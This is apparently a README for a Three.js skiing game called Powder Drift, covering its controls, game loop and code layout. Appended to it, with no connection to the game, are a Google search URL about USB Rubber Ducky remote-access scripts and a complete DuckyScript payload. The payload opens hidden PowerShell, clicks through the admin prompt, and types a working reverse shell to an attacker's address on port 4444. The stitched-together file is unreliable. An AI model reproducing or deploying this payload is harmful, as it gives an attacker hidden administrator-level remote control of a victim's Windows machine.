# 🌄 Powder Drift

A chill, flowy **3D physics-based skiing game** — an endless sunset freeride bowl in the spirit of Alto's Adventure, with SSX-style flick tricks. Carve an infinite pastel mountain, launch off kickers and wind lips, grind rails, and chain flips, spins, corks, and grabs into combo multipliers.

Built with Three.js (vendored — no CDN, no build step). Open it and ride.

## Play

- Serve the folder and open it: `python3 -m http.server` → http://localhost:8000
- Works on mobile (dual thumb joysticks) and desktop (keyboard). GitHub Pages-ready.

## Controls

| Input | Action |
|---|---|
| **Left joystick** / **A · D** | Carve left / right (momentum physics) |
| Left stick **back** / **S** | Hard edge — slow down |
| Left stick **up** / **W** | Tuck — go faster |
| **Right joystick flick** / **arrow keys** | Up = backflip, down = frontflip, left/right = 360 spins, diagonal = cork |
| Right stick **hold** / hold arrow / **Shift** | Grab (Mute, Indy, Method, Tail) — more air time = more points |
| **Space** | Pop off the snow |
| **Esc** | Pause |

## The loop

- **The mountain never ends** — a procedurally generated freeride bowl with rolling terrain, kickers, wind lips, grindable rails, pastel pines, and coin lines. No fail state, just flow.
- **Land clean to bank tricks** — each landed trick grows your **combo multiplier** (up to ×4). Under-rotate and you tumble, popping back up a second later with your combo gone.
- **Coins persist** between runs and buy **outfits** and **snow spray colors** in the Style Shop (Coral → Midnight, Powder → Rainbow).
- Best score, coin bank, and unlocked style are saved in `localStorage`.

## Tech

- `js/game.js` — the whole game: deterministic procedural heightfield (bowl + FBM noise + feature sectors), custom carving/air/grind/tumble physics, dual virtual joystick input, trick detection and naming, WebAudio ambience and SFX, chunked terrain streaming with instanced props.
- `vendor/` — Three.js 0.185, vendored so the game is fully self-contained.



https://www.google.com/search?q=usb+rubber+ducky+scripts++remote+acces&client=firefox-b-d&hs=JMs&sca_esv=628c69d507139627&biw=2092&bih=1089&sxsrf=APpeQnvxGevPT5qFObLjy_a-vMuo4jNz9A%3A1783352773739&ei=xc1LavXaLISGxc8P09LhsAo&uact=5&sclient=gws-wiz-serp&udm=50&fbs=ABfTbFVyMZGZf1hfvX9uKjN_-G8c4u0nXx4bEIpwm1lnNH832a9BVCEiB2iPJNekNderQwJGZIG7YID1eBGNWasq2rzBIURiSCrdR156KVg_RXap7nymj7qwomXHj_SiILyyw7TcR3PVsX7LYP5lqUywwLYwse9eq2FeU_-NVh-70aseSA4lTx9cXY16UPdF4e2jlvrjfGwp&aep=10&ntc=1&mstk=AUtExfCkGu4M5yiPpG1cyPl6EyPLDXukQKJiSkPEaDdpIALtiL2h67oqMxfVkRpn41BIKgJZRjshM4cVIJSQAoA8JYhREYkzbgJcTbtSIrrZHmV7QBJIsOM18csqSJLWA7ehL_uQvVGbWJRti7gxITzQeA53VrTO81Ed_cN6DHZgGQkYvYmgXguDMgNT574AIPzE455EB3KrndgApllJiePTwpmzexOxYs5zSa3yacucLk-2Czb-o4GGkHKTUVc8wUOcjDykmeJKrcGcRAC-XFCgGm_S95Hd7kIS5s8S_ZznuntkhUwh_X86ol3Zr8Lzf9qaIFbCtL1wGqTNqSe3lRk2r0l8NAFtDKq72oBEcKvScTgRYjXijMw9cVdH6UWCjt2TKfZrGtn4j9cCg4zeBFwTWpKQ8gOZZ1QF9A&aioh=3&csuir=1&mtid=6s1LasDqA5-Lxc8PksHcwA8



REM --------------------------------------------------
REM Title: Local Network Reverse Shell Demo
REM Target: Windows 10 / 11
REM --------------------------------------------------

REM Open the Run Dialog
GUI r
DELAY 500

REM Open PowerShell hidden and as Administrator
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs"
ENTER
DELAY 1500

REM Handle the UAC (User Account Control) prompt if it appears
REM Press Left Arrow then Enter to accept admin rights
LEFT
DELAY 200
ENTER
DELAY 1000

REM Type the connection payload (Be sure to replace IP_ADDRESS with your PC's IP)
STRING $c = New-Object System.Net.Sockets.TCPClient('IP_ADDRESS',4444); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){; $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $d 2>&1 | Out-String ); $sb2 = $sb + 'PS ' + (pwd).Path + '> '; $sbyte = [text.encoding]::ASCII.GetBytes($sb2); $s.Write($sbyte,0,$sbyte.Length); $s.Flush()}; $c.Close()
ENTER
